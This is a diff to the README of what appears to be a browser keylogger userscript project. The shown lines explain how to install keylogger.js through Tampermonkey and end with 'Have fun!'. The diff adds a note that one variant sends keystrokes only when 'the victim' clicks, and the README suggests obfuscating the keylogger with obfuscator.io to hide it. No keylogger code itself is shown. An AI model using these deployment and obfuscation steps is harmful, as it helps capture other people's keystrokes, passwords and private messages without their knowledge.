@@ -15,13 +15,15 @@
 ## Usage
 
 ### Install
-1. Download the keylogger.js file
+1. Download the keylogger.js file in the src directory
 2. Open Tampermonkey in your Browser
 3. Go to the Utilities tab
 4. Press the button 'Choose File' at 'Import from file'
 5. Choose the downloaded keylogger.js file
 6. Click on install in the tab that has opened
 7. Have fun!
+
+``Note: keylogger.click.js does only send keys when the victim clicks!``
 
 ### Obfuscation
 The keylogger can also be obfuscated. For example you can use [obfuscator.io](https://obfuscator.io/).
